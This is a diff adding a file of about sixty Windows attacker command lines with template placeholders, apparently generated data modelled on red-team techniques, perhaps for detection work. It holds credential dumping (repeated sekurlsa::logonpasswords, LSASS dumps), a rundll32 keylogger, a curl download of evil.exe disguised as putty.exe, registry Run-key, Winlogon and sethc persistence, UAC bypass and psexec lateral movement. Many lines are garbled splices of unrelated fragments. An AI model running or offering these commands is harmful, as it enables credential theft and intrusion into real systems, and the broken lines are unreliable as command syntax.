@@ -1,0 +1,64 @@
+where /r c : \users\ bookmarks
+rundll32 keylogger_dll.dll , keylog
+`` put $ { filename_regex }
+net user administrator /domain
+get-process where-object { stordiag.exe }
+$ create = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -p $ { username } password= $ { password_table_file_name }
+put stordiag.exe and $ { true full }
+curl http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+nslookup $ { user_name }
+namp -sn $ { command }
+add-content $ `` remove-eventlog -r /user : $ { lsass_pid } -f $ { dump_file }
+sharprdp.exe computername= $ { user_name } /add
+rundll32 popcalc.dll , keylog
+wscript $ { domain }
+net group `` c : account base64_commmand '' '' ;
+namp -sn $ { user_name } /add
+rundll32 $ { hklm\software\microsoft\windows lsass_pid }
+quser
+$ shortcut = `` [ lsass ) ; get-domainuser -verbose
+cmdkey /list
+sekurlsa : :logonpasswords
+hydra -l $ ( @ `` hkcu\software\microsoft\windows hkey_local_machine\software\microsoft\windows menu\programs\startup\t1547.009.lnk '' `` $ profile ''
+net user $ { domain }
+get-childitem $ { username } /domain : username
+get-ciminstance -classname win32_desktop
+`` $ = : \windows\system32\desk.cpl , keylog
+get-localgroupmember -group ''
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' ;
+namp -sn $ { ip }
+reg add `` hkcu\software\microsoft\windows\currentversion\run '' '' `` `` inprocserver32 '' $ true
+del $ { username } \appdata\local\temp\lsass.dmp
+python archive_file.py $ { domain }
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters '' '' /v `` appinit_dlls '' '' -force { select-object name ' } , fullname name ' string ' } ' '' , $ create } \windows\ntds\ntds.dit $ { ip_prefix for ntds.dit }
+powershell `` add `` c : \windows\system32\sethc.exe c : \users\ bookmarks
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v impersonate /d `` 1 )
+sekurlsa : :logonpasswords
+sc.exe create $ { user_name }
+set-psreadlineoption -historysavestyle savenothing
+sekurlsa : :logonpasswords
+net user administrator /domain
+get-process headless -- buildnumber , disabled $ true
+net user $ { username } password= $ { target_ip }
+$ env : psexecutionpolicypreference = `` bypass ''
+`` $ `` hklm\system\currentcontrolset\services\ = `` $ ( i ;
+get-localgroup
+sekurlsa : :logonpasswords
+sekurlsa : :logonpasswords
+net user = `` $ { username } '' `` $ { command } ''
+for cim in ( [ ) /y $ { ' } , fullname , fullname '
+-m -path `` hkcu : software\classes\clsid\ env `` cor_profiler '' $ { username /f
+`` add `` explorer.exe , select * c : \windows\system32\sethc_backup.exe
+workfolders
+reg add `` hkcu\software\microsoft\windows\currentversion\run '' `` exit ''
+net user administrator /domain
+bitsadmin.exe /setnotifycmdline $ { $ { user_name } & -l $ { outpout_file }
+rundll32 popcalc.dll , cor_profiler = ' ' $ { -resolvehost 'running ' '' -w $ { path } -w { url }
+rdrleakdiag.exe /p $ { domain } /user : $ { remote_host }
+psexec \\ { ip_address } -u $ { copy path /krbtgt : path } -u $ { day } -l $ { command }
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' /v `` driver '' /d `` $ { binary_file_path } , `` $ { binary__file_path } '' -asplaintext -force or fltmc.exe
+net localgroup administrators
+settingsynchost -loadandrundiagscript $ { local_file_path }
+vshadow zero_padding.py $ { directory_path }
+net localgroup administrators $ { service_name } binpath= `` $ { args } ''
+bypassuac.exe $ { command }
